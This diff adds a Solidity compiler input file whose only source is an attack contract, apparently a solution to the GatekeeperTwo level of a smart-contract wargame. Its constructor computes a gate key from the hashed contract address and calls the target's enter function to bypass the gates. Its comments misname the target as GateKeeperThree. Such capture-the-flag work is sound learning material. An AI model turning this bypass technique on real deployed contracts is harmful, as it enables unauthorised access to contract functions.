@@ -1,0 +1,35 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/GateKeeperTwo/AttackGateKeeperTwo.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/// @title AttackGateKeeperTwo\n/// @author IbCaOs\ncontract AttackGateKeeperTwo {\n    // Public variable to store the address of the GateKeeper contract\n    address public gateKeeper;\n\n    /// @dev Constructor to initiate an attack attempt when this contract is deployed\n    /// @param _target The address of the GateKeeper contract to be attacked\n    constructor(address _target) {\n        // Set the GateKeeper address\n        gateKeeper = _target;\n\n        // In the GateKeeperThree contract, there's a require statement which checks\n        // if the XOR operation of the hashed sender address and _gateKey equals type(uint64).max.\n        // By using maxUint64 (which is type(uint64).max) and the hashed address of this contract,\n        // we are essentially calculating the \"inverse\" for the XOR operation.\n        // This helps us generate a valid _gateKey that satisfies the require statement in GateKeeperThree.\n\n        // Define the maximum value for a uint64 type.\n        uint64 maxUint64 = 0xFFFFFFFFFFFFFFFF;\n\n        // Hash the contract's address and convert it into a uint64 type.\n        uint64 sender = uint64(\n            bytes8(keccak256(abi.encodePacked(address(this))))\n        );\n\n        // Compute the XOR between maxUint64 and sender to generate the 'gateKey'.\n        bytes8 gateKey = bytes8(maxUint64 ^ sender);\n\n        // Call the 'enter' function of the GateKeeper contract with the generated 'gateKey'\n        (bool success, ) = _target.call(\n            abi.encodeWithSignature(\"enter(bytes8)\", gateKey)\n        );\n\n        // Ensure the transaction was successful, if not, revert with an error message\n        require(success, \"ERROR: TX FAILED\");\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
